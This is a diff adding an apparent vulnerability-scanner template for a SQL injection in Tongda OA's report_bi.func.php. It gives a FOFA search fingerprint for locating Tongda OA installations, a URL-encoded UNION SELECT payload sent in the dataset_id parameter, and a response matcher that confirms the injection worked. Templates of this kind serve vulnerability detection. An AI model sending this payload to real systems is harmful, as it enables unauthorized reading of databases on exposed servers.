@@ -1,0 +1,21 @@
+id: poc-yaml-tongda-oa-report-bi-func-php-sqli
+info:
+  name: 通达OA report_bi.func.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /general/bi_design/appcenter/report_bi.func.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cmd5%28{{.t1}}%29%23%27&action=get_link_info&
+  expression: status_code == 200 && contains(body,"\"col\"\x3a \"td_oa\"") && contains(body,t2)
+    && !contains(body,"<")
+transport: http
